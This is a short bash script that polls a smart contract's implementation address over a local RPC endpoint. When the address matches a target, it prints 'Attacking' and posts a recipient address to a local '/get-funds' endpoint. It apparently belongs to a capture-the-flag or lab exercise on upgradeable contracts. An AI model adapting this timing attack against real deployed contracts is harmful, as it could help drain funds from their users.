
target_active="0x000000000000000000000000e5ed47bcc12028b9be183a80b8821119e9397ef7"
while [ 1 -eq 1 ]
do
    current_active=$(cast call 0xe6cc6358e23fcb274c0e0696d6f9635bd9f223b1  "getImplementation1599d()" --rpc-url http://localhost:8080/rpc)
    echo "Currently Active:$current_active"
    if [ "$current_active" == "$target_active" ]; then
        echo "Attacking"
        curl http://localhost:8080/get-funds -H "Content-Type: application/json" -d '{"address":"0x360B0B52025095275702d094Fce7C0d6087E3676"}'
        exit 0
    else
        echo "Not Attacking"
    fi
    sleep 1
done